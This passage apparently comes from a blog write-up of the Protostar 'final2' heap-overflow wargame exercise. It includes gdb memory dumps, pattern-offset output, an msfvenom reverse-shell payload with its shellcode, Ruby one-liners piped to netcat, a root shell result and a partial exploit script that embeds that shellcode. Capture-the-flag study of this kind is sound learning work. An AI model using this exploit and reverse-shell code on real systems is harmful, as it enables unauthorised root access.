</span><span class='line'>0x804e070:  0x64413364  0x35644134  0x41366441  0x64413764
</span><span class='line'>0x804e080:  0x39644138  0x00000084  0xfffffff8  0xfffffffc
</span><span class='line'>0x804e090:  0x0804d410  0x0804e010  0x58585858  0x58585858
</span><span class='line'>0x804e0a0:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0b0:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0c0:  0x58585858  0x58585858  0x58585858  0x58585858
</span><span class='line'>0x804e0d0:  0x58585858  0x58585858</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413161
</span><span class='line'>[&lt;em>] Exact match at offset 4
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413561
</span><span class='line'>[&lt;/em>] Exact match at offset 16
</span><span class='line'>root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x39644138
</span><span class='line'>[*] Exact match at offset 116</span></code></pre></td></tr></table></div></figure></p>

<p>Our code starts at pattern offset <code>4</code>. There is also modification in the first <code>12</code> bytes, we use <code>2</code> bytes instruction and skip next <code>10</code> bytes, using <code>\xeb\x0a</code> opcode.</p>

<p>After another segfault, we have in gdb:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + &ldquo;a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0&rdquo; + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /i 0x804e010
</span><span class='line'>0x804e010:  jmp    0x804e01c&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /30x 0x804e01c
</span><span class='line'>0x804e01c:  0x61413561  0x37614136  0x41386141  0x62413961
</span><span class='line'>0x804e02c:  0x31624130  0x41326241  0x62413362  0x35624134
</span><span class='line'>0x804e03c:  0x41366241  0x62413762  0x39624138  0x41306341
</span><span class='line'>0x804e04c:  0x63413163  0x33634132  0x41346341  0x63413563
</span><span class='line'>0x804e05c:  0x37634136  0x41386341  0x64413963  0x31644130
</span><span class='line'>0x804e06c:  0x41326441  0x64413364  0x35644134  0x41366441
</span><span class='line'>0x804e07c:  0x64413764  0x39644138  0x00000084  0xfffffff8
</span><span class='line'>0x804e08c:  0xfffffffc  0x0804d410&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + &ldquo;D&rdquo; * 107" + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> x /30x 0x804e01c
</span><span class='line'>0x804e01c:  0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e02c:  0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e03c:  0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e04c:  0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e05c:  0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e06c:  0x44444444  0x44444444  0x44444444  0x44444444
</span><span class='line'>0x804e07c:  0x44444444  0x44444444  0x00000084  0xfffffff8
</span><span class='line'>0x804e08c:  0xfffffffc  0x0804d410</span></code></pre></td></tr></table></div></figure></p>

<p>We can see above, that we have <code>26*4=104</code> bytes for our shellcode.</p>

<p>Exploitation:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 1:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;h1>we add 0x5c = &lsquo;/&rsquo; to our bad chars list&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &lsquo;\x0a\x0d\x5c\x00&rsquo; -f sh
</span><span class='line'>No platform was selected, choosing Msf::Module::Platform::Linux from the payload
</span><span class='line'>No Arch selected, selecting Arch: x86 from the payload
</span><span class='line'>Found 22 compatible encoders
</span><span class='line'>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
</span><span class='line'>x86/shikata_ga_nai succeeded with size 95 (iteration=0)
</span><span class='line'>Payload size: 95 bytes
</span><span class='line'>export buf=\
</span><span class='line'>$&lsquo;\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9&rsquo;\
</span><span class='line'>$&lsquo;\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb&rsquo;\
</span><span class='line'>$&lsquo;\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f&rsquo;\
</span><span class='line'>$&lsquo;\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16&rsquo;\
</span><span class='line'>$&lsquo;\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6&rsquo;\
</span><span class='line'>$&lsquo;\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8&rsquo;\
</span><span class='line'>$&lsquo;\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62&rsquo;&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ export buf=\&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;blockquote>&lt;p>$&lsquo;\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9&rsquo;\
</span><span class='line'>$&lsquo;\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb&rsquo;\
</span><span class='line'>$&lsquo;\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f&rsquo;\
</span><span class='line'>$&lsquo;\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16&rsquo;\
</span><span class='line'>$&lsquo;\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6&rsquo;\
</span><span class='line'>$&lsquo;\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8&rsquo;\
</span><span class='line'>$&lsquo;\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62&rsquo;&lt;/p>&lt;/blockquote>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 3:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:~$ nc -l -p 1337&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 2:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + ENV[&ldquo;buf&rdquo;] + &ldquo;D&rdquo; * (107 - ENV[&ldquo;buf&rdquo;].length) + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993
</span><span class='line'>Process OK&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>window 3:&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><figcaption><span>exploit-final2.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;require &amp;lsquo;socket&amp;rsquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">user</span><span class="vi">@protostar</span><span class="ss">:~</span><span class="err">$</span> <span class="n">objdump</span> <span class="o">-</span><span class="no">TR</span> <span class="sr">/opt/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">final2</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">R_386_JUMP_SLOT</span><span class="o">.</span><span class="n">*</span> <span class="n">write</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;0804d41c R_386_JUMP_SLOT   write&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">gdb</span><span class="o">&gt;</span> <span class="nb">print</span> <span class="sr">/x 0x0804d41c-0xc&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="vg">$1</span> <span class="o">=</span> <span class="mh">0x804d410</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;root@protostar:/</span><span class="n">tmp</span><span class="c1"># ltrace  -e memset -f /opt/protostar/bin/final2&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;[</span><span class="n">pid</span> <span class="mi">2803</span><span class="o">]</span> <span class="o">+++</span> <span class="n">exited</span> <span class="p">(</span><span class="n">status</span> <span class="mi">0</span><span class="p">)</span> <span class="o">+++&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;[pid 2804] memset(0xbffff71c, &amp;lsquo;\000&amp;rsquo;, 16)     = 0xbffff71c&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;[</span><span class="n">pid</span> <span class="mi">2807</span><span class="o">]</span> <span class="n">memset</span><span class="p">(</span><span class="mh">0x0804e008</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;\</span><span class="mo">000</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">132</span><span class="p">)</span>    <span class="o">=</span> <span class="mh">0x0804e008</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="n">first</span> <span class="n">chunk</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;[pid 2807] memset(0x0804e090, &amp;lsquo;\000&amp;rsquo;, 132)    = 0x0804e090 &amp;lt;= second chunk&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;[</span><span class="n">pid</span> <span class="mi">2807</span><span class="o">]</span> <span class="n">memset</span><span class="p">(</span><span class="mh">0x0804e118</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;\</span><span class="mo">000</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;,</span> <span class="mi">132</span><span class="p">)</span>    <span class="o">=</span> <span class="mh">0x0804e118</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="o">=</span> <span class="n">third</span> <span class="n">chunk</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;root@kali32:~# ruby -e &amp;lsquo;puts &amp;ldquo;0x&amp;rdquo;+(0x0804e008+&amp;ldquo;FSDRAa0A&amp;rdquo;.length).to_s(16)&amp;rsquo;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mh">0x804e010</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;root@kali32:~# /us</span><span class="n">r</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">msfvenom</span> <span class="o">-</span><span class="nb">p</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">shell_reverse_tcp</span> <span class="no">LHOST</span><span class="o">=</span><span class="mi">127</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">0</span><span class="o">.</span><span class="mi">1</span> <span class="no">LPORT</span><span class="o">=</span><span class="mi">1337</span> <span class="o">-</span><span class="n">b</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;\</span><span class="n">x0a</span><span class="p">\</span><span class="n">x0d</span><span class="p">\</span><span class="n">x5c</span><span class="p">\</span><span class="n">x00</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span> <span class="o">-</span><span class="n">f</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;No platform was selected, choosing Msf::Module::Platform::Linux from the payload&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="no">No</span> <span class="no">Arch</span> <span class="n">selected</span><span class="p">,</span> <span class="n">selecting</span> <span class="ss">Arch</span><span class="p">:</span> <span class="n">x86</span> <span class="n">from</span> <span class="n">the</span> <span class="n">payload</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;Found 22 compatible encoders&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="no">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="n">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;x86/s</span><span class="n">hikata_ga_nai</span> <span class="n">succeeded</span> <span class="n">with</span> <span class="n">size</span> <span class="mi">95</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;Payload size: 95 bytes&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">buf</span> <span class="o">=</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">xbf</span><span class="p">\</span><span class="n">x9e</span><span class="p">\</span><span class="n">x53</span><span class="p">\</span><span class="n">x7d</span><span class="p">\</span><span class="n">x18</span><span class="p">\</span><span class="n">xda</span><span class="p">\</span><span class="n">xc5</span><span class="p">\</span><span class="n">xd9</span><span class="p">\</span><span class="n">x74</span><span class="p">\</span><span class="n">x24</span><span class="p">\</span><span class="n">xf4</span><span class="p">\</span><span class="n">x5e</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">xc9</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">xb1</span><span class="p">\</span><span class="n">x12</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x7e</span><span class="p">\</span><span class="n">x12</span><span class="p">\</span><span class="n">x83</span><span class="p">\</span><span class="n">xee</span><span class="p">\</span><span class="n">xfc</span><span class="p">\</span><span class="n">x03</span><span class="p">\</span><span class="n">xe0</span><span class="p">\</span><span class="n">x5d</span><span class="p">\</span><span class="n">x9f</span><span class="p">\</span><span class="n">xed</span><span class="p">\</span><span class="n">x2d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">xb9</span><span class="p">\</span><span class="n">xa8</span><span class="p">\</span><span class="n">xed</span><span class="p">\</span><span class="n">x1e</span><span class="p">\</span><span class="n">x7e</span><span class="p">\</span><span class="n">x04</span><span class="p">\</span><span class="n">x98</span><span class="p">\</span><span class="n">xa2</span><span class="p">\</span><span class="n">x09</span><span class="p">\</span><span class="n">x4b</span><span class="p">\</span><span class="n">xec</span><span class="p">\</span><span class="n">xc4</span><span class="p">\</span><span class="n">xc4</span><span class="p">\</span><span class="n">x0c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x9e</span><span class="p">\</span><span class="n">x51</span><span class="p">\</span><span class="n">x67</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">x6c</span><span class="p">\</span><span class="n">xe1</span><span class="p">\</span><span class="n">xce</span><span class="p">\</span><span class="n">x35</span><span class="p">\</span><span class="n">x97</span><span class="p">\</span><span class="n">x89</span><span class="p">\</span><span class="n">xaf</span><span class="p">\</span><span class="n">xc5</span><span class="p">\</span><span class="n">x67</span><span class="p">\</span><span class="n">x48</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x38</span><span class="p">\</span><span class="n">xc4</span><span class="p">\</span><span class="n">x67</span><span class="p">\</span><span class="n">x4f</span><span class="p">\</span><span class="n">x81</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x86</span><span class="p">\</span><span class="n">xff</span><span class="p">\</span><span class="n">x97</span><span class="p">\</span><span class="n">x01</span><span class="p">\</span><span class="n">x18</span><span class="p">\</span><span class="n">xac</span><span class="p">\</span><span class="n">xe4</span><span class="p">\</span><span class="n">xa1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x13</span><span class="p">\</span><span class="n">xb3</span><span class="p">\</span><span class="n">xc6</span><span class="p">\</span><span class="n">x26</span><span class="p">\</span><span class="n">x71</span><span class="p">\</span><span class="n">x5b</span><span class="p">\</span><span class="n">xf6</span><span class="p">\</span><span class="n">x09</span><span class="p">\</span><span class="n">x05</span><span class="p">\</span><span class="n">xf3</span><span class="p">\</span><span class="n">x60</span><span class="p">\</span><span class="n">x79</span><span class="p">\</span><span class="n">x8b</span><span class="p">\</span><span class="n">x6a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x1f</span><span class="p">\</span><span class="n">x0c</span><span class="p">\</span><span class="n">xa8</span><span class="p">\</span><span class="n">x3e</span><span class="p">\</span><span class="n">x8c</span><span class="p">\</span><span class="n">x87</span><span class="p">\</span><span class="n">xce</span><span class="p">\</span><span class="n">x0e</span><span class="p">\</span><span class="n">x39</span><span class="p">\</span><span class="n">x55</span><span class="p">\</span><span class="n">x90</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;chunk1 = &amp;ldquo;FSRD&amp;rdquo; + &amp;ldquo;Aa0A&amp;rdquo; + &amp;ldquo;\xeb\x0a&amp;rdquo; + &amp;ldquo;X&amp;rdquo; * 10 + buf + &amp;ldquo;D&amp;rdquo; * (107 - buf.length) + &amp;ldquo;/</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span>
</span><span class='line'><span class="n">chunk2</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">FSRD</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">ROOT</span><span class="o">/&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0xfffffff8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0xfffffffc</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0x804d410</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">[</span><span class="mh">0x804e010</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">V</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;)</span> <span class="o">+</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">X</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">*</span>  <span class="mi">103</span>
</span><span class='line'><span class="n">chunk3</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">DDDD</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;exploit = chunk1 + chunk2 + chunk3&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">80</span><span class="o">.</span><span class="mi">154</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
